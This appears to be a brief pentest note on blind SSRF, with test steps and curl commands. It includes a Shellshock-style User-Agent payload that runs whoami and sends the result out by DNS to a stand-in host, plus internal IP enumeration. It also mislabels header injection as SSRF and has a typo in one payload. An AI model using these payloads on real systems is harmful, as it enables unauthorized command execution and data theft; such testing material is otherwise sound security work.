## Use case

The application was vulnerable to Blind SSRF, allowing an attacker to send crafted requests to internal services. This vulnerability could lead to Remote Code Execution if the internal service is exploitable.

## Steps to test

1. Identify an endpoint that accepts user-controlled input for making requests.
2. Craft a request with a User-Agent header set to '() {:;}; /usr/bin/nslookup $(.whoami).myserver.com'.
3. Send the request and observe if there is any response indicating the execution of the command.
4. If no response is received, attempt to enumerate internal IP addresses by sending requests with the last octet of the IP address incremented by 1.

## Commands

```text
curl -H 'User-Agent: () {:;}; /usr/bin/nslookup $(whoami).example.com' https://target.com/endpoint
curl -H 'Referer: https://target.com/' https://target.com/endpoint?ip=192.168.1.1
```
